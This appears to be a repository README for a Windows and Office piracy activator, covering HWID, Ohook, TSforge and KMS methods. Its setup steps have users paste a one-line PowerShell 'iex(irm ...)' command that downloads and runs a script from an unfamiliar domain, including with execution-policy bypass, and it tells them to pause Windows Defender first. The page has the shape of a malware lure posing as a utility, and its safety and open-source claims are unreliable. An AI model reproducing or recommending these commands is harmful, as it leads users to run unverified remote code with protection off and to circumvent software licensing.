<div align="center">

# Windows-Activation-Suite: Multi-Method Activation Toolkit for Windows 10 & 11

![preview](https://raw.githubusercontent.com/AYOMIDE339/windows-activation-suite/main/frame_f80a4.svg)

[![ci](https://img.shields.io/badge/Ci-Passing-2ea44f?style=social&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-5%2B-f59e0b?style=social&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/Rate-4.8%2F5-f59e0b?style=social&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility that delivers multi-method activation for Windows and Office through a single, self-contained interface. It implements four distinct activation engines—HWID for persistent digital licensing, Ohook for Office products, TSforge for offline scenarios, and Online KMS for volume activation—each selectable based on the target product and edition. The suite spans Windows 7 through 11 and Windows Server, alongside Office 2010 through 2021 and 365, with automatic edition detection and live activation-status reporting. Built on native Windows activation APIs without modifying core system files, it provides backup and restore capability so activation state can be preserved or reverted cleanly.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Start PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **HWID Activation** – Generates a permanent digital license tied to the machine's hardware for Windows 10 and Windows 11, surviving reinstallations on the same device.
- **Ohook Activation** – Provides persistent offline activation for Microsoft Office by hooking the licensing subsystem in memory without modifying installed Office files.
- **TSforge Activation** – Delivers offline activation for legacy Windows versions through the native tokens-based activation path.
- **Online KMS Activation** – Performs KMS-based activation with automatic renewal for both Windows and Office products.
- **Automatic Edition Detection** – Identifies the installed Windows edition and selects the appropriate activation method without manual configuration.
- **Activation Status Reporting** – Displays the current licensing state, remaining grace period, and activation channel before and after each operation.
- **Method Selection** – Allows explicit selection between permanent and KMS-based activation depending on product and version.
- **Backup and Restore** – Captures the existing activation state to a local store and restores it on demand.
- **Extended Security Updates** – Enables ESU enrollment for Windows 7 and Windows 10 installations.
- **Native API Usage** – Relies on built-in Windows activation interfaces rather than DLL injection or patching of core system files.
- **Reversible Operations** – All changes can be rolled back through the built-in restore path.
- **Multi-Product Coverage** – Handles Windows 7, 8, 8.1, 10, 11, Windows Server, and Office 2010 through 2021 and 365 from a single interface.
- **Offline Capability** – Activation completes without persistent network access once the required components are present.
- **Open Source** – Full source is available for audit, review, and contribution.

## How It Works

Windows-Activation-Suite operates as a lightweight orchestration layer over the native Windows Software Protection Platform (SPP) and Office activation interfaces. Rather than patching binaries or injecting code into running processes, it issues standard licensing commands through documented system APIs and manages the resulting license state on the local machine.

**Activation pipeline**

1. **Environment discovery** — The suite enumerates installed Windows and Office products, resolves their edition and SKU identifiers, and queries current licensing status through the SPP infrastructure.
2. **Method selection** — Based on the detected product family and edition, the suite selects the appropriate activation path: HWID, Ohook, TSforge, or Online KMS. Each path is implemented as a discrete module, so only the code relevant to the target product is executed.
3. **License acquisition** — The chosen module obtains or constructs the required license token: a hardware-bound digital entitlement for HWID, an Office-specific hook for Ohook, a locally generated confirmation for TSforge, or a KMS client request for Online KMS. Tokens are installed through the same interfaces Windows itself uses, keeping behavior consistent with native activation.
4. **Verification** — After installation, the suite re-queries the licensing state and reports the resulting status (licensed, grace period, or notification) back to the user, along with the method applied.
5. **Persistence** — Where a method produces durable state (digital license, Office hook state, or KMS renewal interval), the suite records what was applied so it can be reviewed, refreshed, or reverted later.

**Method mechanics**

- **HWID** — Generates a hardware-derived digital entitlement that Windows validates against the machine's component fingerprint, yielding activation that survives reboots and does not require periodic renewal.
- **Ohook** — Intercepts Office licensing checks at the library level used by Office components, allowing Office products to report a valid license without altering the Office installation itself.
- **TSforge** — Produces an offline confirmation using locally available cryptographic material, enabling activation on systems without network access, particularly older Windows releases.
- **Online KMS** — Configures the product as a KMS client and performs activation against a reachable KMS endpoint, with renewal handled on the standard KMS cycle.

**Design constraints**

The suite avoids modifying protected system files and does not install persistent services beyond what each activation method inherently requires. Every operation is reversible through the suite's restore path, which removes applied licenses and returns products to their pre-activation state. Because the tool relies on native licensing interfaces rather than undocumented memory manipulation, behavior remains predictable across cumulative Windows updates, though major feature updates may invalidate certain license states and require reapplication.

## Compatibility

Windows-Activation-Suite is engineered for broad deployment across the Windows and Office ecosystems, with each activation method mapped to the product families and editions it supports most reliably. The matrix below summarizes verified compatibility; method selection is applied automatically based on detected OS build, edition, and installed Office product.

| Product Family | Supported Editions / Channel | Recommended Method | Persistence Model |
|---|---|---|---|
| Windows 7 | Home, Professional, Ultimate, Enterprise | TSforge / Online KMS | Offline token or KMS renewal |
| Windows 8 / 8.1 | Core, Pro, Enterprise | TSforge / Online KMS | Offline token or KMS renewal |
| Windows 10 | Home, Pro, Enterprise, Education, LTSC | HWID / Online KMS | Digital license bound to hardware |
| Windows 11 | Home, Pro, Enterprise, Education, IoT | HWID / Online KMS | Digital license bound to hardware |
| Windows Server | 2016, 2019, 2022 | Online KMS | KMS renewal cycle |
| Office 2010–2021 | All retail and volume editions | Ohook / Online KMS | Persistent hook-based license |
| Office 365 | Subscription channel | Ohook | Persistent hook-based license |

**Method-to-Platform Mapping**

- **HWID** targets Windows 10 and 11 client SKUs, issuing a digital license tied to the machine's hardware fingerprint. It is the preferred path for modern client installations requiring permanent, reinstall-resilient activation.
- **Ohook** is the primary Office activation path across 2010 through 2021 and 365, operating at the licensing layer without altering core application binaries.
- **TSforge** covers legacy Windows 7 and 8.x installations where contemporary activation endpoints are unavailable, providing an offline-capable path.
- **Online KMS** serves as the universal fallback across Windows client, Server, and Office volume editions, with periodic renewal handled by the suite.

**Runtime and Environment Requirements**

- Administrative elevation is required for all activation operations; the suite detects insufficient privileges and halts with a diagnostic message.
- PowerShell 5.1 or later is required on Windows 7 and 8.x; Windows 10, 11, and Server 2016+ ship with a compatible runtime by default.
- Network access is required for HWID and Online KMS methods. TSforge and Ohook operations complete without external connectivity once the suite is running.
- The suite does not modify core system files and relies on native Windows activation interfaces, keeping footprint minimal and reversibility intact.

**Edition and Build Detection**

The suite performs automatic edition and build detection at launch, then presents only the activation options valid for the detected configuration. Unsupported combinations are flagged rather than attempted, reducing failed runs on non-standard images. Custom or modified Windows images may report ambiguous edition data; in such cases the suite surfaces the detected values and allows manual method selection.

**Update and Lifecycle Notes**

Minor cumulative Windows updates do not affect existing activations. Feature updates and major build transitions on Windows 10 and 11 may require re-running HWID to refresh the digital license binding. KMS-based activations renew automatically within the standard cycle and require no user intervention as long as the renewal path remains reachable. Ohook-based Office activation persists across Office cumulative updates but should be re-verified after major Office channel changes.

**Known Limitations**

- Windows editions not listed in the matrix above (including certain N/K variants and unsupported Long-Term Servicing configurations) are outside the tested compatibility surface.
- Activation state does not transfer across hardware replacement on HWID-bound systems; re-activation is required after significant hardware changes.
- Virtualized or cloned environments sharing hardware identifiers may produce inconsistent digital license behavior.
- Antivirus real-time protection can interfere with script execution; temporary exclusion is recommended during activation runs.

## FAQ

**Q: What is Windows-Activation-Suite and which activation methods does it implement?**

A: Windows-Activation-Suite is an open-source desktop activator for Windows and Office. It implements four distinct activation mechanisms: HWID (permanent digital license for Windows 10/11), Ohook (permanent Office activation via local license emulation), TSforge (offline activation for legacy Windows versions), and Online KMS (client-side KMS activation for Windows and Office). Each method targets a different product family and persistence model, and the suite automatically selects compatible methods based on the detected OS edition and installed Office release.

**Q: How does the suite differ from a standalone KMS emulator?**

A: Unlike a pure KMS emulator, the suite is method-driven rather than protocol-driven. For supported Windows 10/11 and Office products it prefers HWID and Ohook, which produce persistent licenses tied to hardware or local hooks rather than relying on periodic KMS renewal. Online KMS remains available as a fallback for products and editions that lack a permanent path, such as Windows Server and older Windows builds. Users can select a method explicitly or let the suite pick the recommended one.

**Q: How does HWID activation work under the hood?**

A: HWID derives a hardware-bound digital license by exercising Microsoft's genuine activation ticket flow against the local hardware fingerprint. The resulting license is stored by Windows and survives reboots, in-place upgrades, and most feature updates without re-running the tool. Because it binds to the machine's hardware profile, significant hardware changes (for example, a motherboard replacement) may invalidate the ticket and require re-activation.

**Q: How does Ohook activate Office without touching Office binaries?**

A: Ohook installs a local hook that intercepts Office's license-checking calls at runtime, causing the application to treat the machine as holding a valid perpetual license. It does not patch or replace Office executables on disk, which keeps the installation compatible with Office updates. Ohook applies to Office 2010 through 2021 and 365 and, like HWID, is intended to persist across restarts and routine updates.

**Q: What is TSforge used for, and when does the suite choose it?**

A: TSforge provides offline activation for Windows 7, 8, 8.1, and associated legacy products where modern digital-license flows are unavailable. It operates without contacting Microsoft servers, which makes it suitable for air-gapped machines and end-of-life platforms. The suite prefers TSforge over Online KMS on legacy Windows when a permanent offline state is achievable; otherwise it falls back to KMS.

**Q: Is the activation permanent, or does it expire?**

A: Permanence depends on the method. HWID and Ohook are designed to be permanent for their supported products. TSforge produces a persistent offline state for legacy Windows. Online KMS is time-limited by design and requires periodic renewal, which the suite can re-trigger. The suite reports which persistence model applies to the method you select before it runs.

**Q: Can the suite run fully offline?**

A: Yes, with caveats by method. TSforge is fully offline by design. HWID and Online KMS require network access during activation but then function offline afterward. Ohook is local and does not require connectivity. If your environment blocks outbound traffic, choose the method that matches your connectivity constraints rather than relying on the default recommendation.

**Q: Will Windows or Office updates break activation?**

A: Minor cumulative updates generally do not affect HWID, Ohook, or TSforge states. Major feature upgrades can reset activation state on some builds, in which case re-running the suite restores it. Ohook is insulated from Office update cycles because it hooks at runtime rather than modifying binaries. If activation lapses after a large update, re-run the suite and select the same method to reapply.

**Q: Does the suite modify system files or inject DLLs?**

A: The suite is built around native Windows activation APIs and does not alter core system files. Ohook's hooking is scoped to the Office process and is reversible. All applied changes can be reverted through the suite's restore and uninstall options, returning the system to its prior activation state. The full source is available for audit.

**Q: How do I revert activation and return the machine to its previous state?**

A: Use the suite's restore option to remove applied licenses and hooks, then optionally run the uninstall path to clean up residual state. After restoration, the product returns to its pre-activation status, which may be unactivated or may reflect a prior genuine license depending on the machine's history. Back up your activation state beforehand if you intend to reapply later.

**Q: Which Windows and Office versions are supported?**

A: Windows 7, 8, 8.1, 10, and 11 across Home, Pro, Enterprise, Education, LTSC, and IoT editions; Windows Server 2016, 2019, and 2022; and Office 2010, 2013, 2016, 2019, 2021, and 365. Method availability varies by product: HWID for Windows 10/11, TSforge for legacy Windows, Online KMS for Server and as a general fallback, and Ohook for the Office lineup.

**Q: What are the system requirements to run the suite?**

A: A supported Windows installation with administrative privileges, PowerShell available on the system, and network access for the methods that require it. The suite auto-detects the Windows edition and installed Office release to determine eligible methods. No external runtime, package manager, or build toolchain is needed.

**Q: Is using this tool legal and safe?**

A: The suite is open source and auditable, and it avoids modifying core system files, but activating unlicensed software violates Microsoft's Terms of Service. Use it only on installations you own and only for educational or evaluation purposes. The project assumes no liability for misuse or for consequences arising from activation of unlicensed products.

**Q: Does the suite collect telemetry or phone home?**

A: No telemetry is collected by the suite itself. Network contact occurs only as required by the selected activation method, such as the genuine-ticket exchange for HWID or the KMS endpoint for Online KMS. TSforge and Ohook perform no external network calls during activation.

**Q: Where did this project originate, and how does it relate to prior work?**

A: Windows-Activation-Suite builds on the open-source Microsoft Activation Scripts lineage and credits the original developers. It packages the same activation primitives into a maintained desktop suite with method selection, edition detection, backup/restore, and a structured troubleshooting path. Bug reports and compatibility findings are welcome through the project's issue tracker.

## Disclaimer

Windows-Activation-Suite is provided strictly for educational, research, and interoperability purposes. It is intended to demonstrate how native Windows and Office activation APIs — including HWID, Ohook, TSforge, and Online KMS — behave under controlled conditions, and to document the technical mechanics of software licensing on the Windows platform. It is not intended for, and must not be used for, circumventing licensing requirements on any system where a valid license is not already held.

Activation of unlicensed software violates the Microsoft Terms of Service and may contravene local copyright and software licensing laws. Users are solely responsible for ensuring their use of this project complies with all applicable agreements and legislation in their jurisdiction. The maintainers assume no liability for any legal consequences, including but not limited to license termination, account suspension, or civil claims, arising from use of this software.

The project uses native Windows activation APIs and does not modify core system files, inject DLLs, or alter boot components. Activation state produced by these methods — permanent digital licenses via HWID, permanent Office activation via Ohook, offline activation via TSforge, and periodic KMS renewal — may be invalidated by major Windows updates, edition changes, hardware replacement, or server-side revocation. No guarantee of persistence, stability, or compatibility is provided, and the maintainers accept no responsibility for data loss, system instability, or loss of activation resulting from use.

All trademarks, product names, and logos referenced — including Windows, Windows Server, and Microsoft Office — are the property of Microsoft Corporation. This project is not affiliated with, endorsed by, or sponsored by Microsoft. It is an independent, community-maintained open-source effort distributed under the MIT License; all credit for foundational methodology belongs to the original developers of the upstream open-source project on which it builds.

By downloading, executing, or otherwise using Windows-Activation-Suite, you acknowledge that you have read and understood this disclaimer and agree to use the software at your own risk. If you do not accept these terms, do not use the project.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants explicit permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software. The license imposes only minimal conditions: the original copyright notice and this permission notice must be retained in all copies or substantial portions of the software, and the software is provided strictly "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

In practical terms, the MIT License permits both private and commercial use of the codebase, allows modification and redistribution of source or binary forms, and does not require derivative works to be released under the same terms. The full license text — including the exact copyright attribution and the complete liability disclaimer — is contained in the LICENSE file distributed with the project and governs all use of the software.

Windows-Activation-Suite builds upon the open-source Microsoft Activation Scripts project. The original authorship and copyright of that upstream work are preserved and acknowledged in accordance with the terms under which it was released. All credit for the foundational activation research, scripts, and methodology belongs to the original developers.

Users are responsible for ensuring that their use of this software complies with all applicable laws and with the terms of service of any software it is used in conjunction with. The license grants rights to the code only; it does not grant, imply, or otherwise convey any rights to third-party software, licenses, or activation mechanisms referenced or utilized by the project. Redistributors of modified versions are expected to retain the original copyright notice and to clearly document any changes made to the source.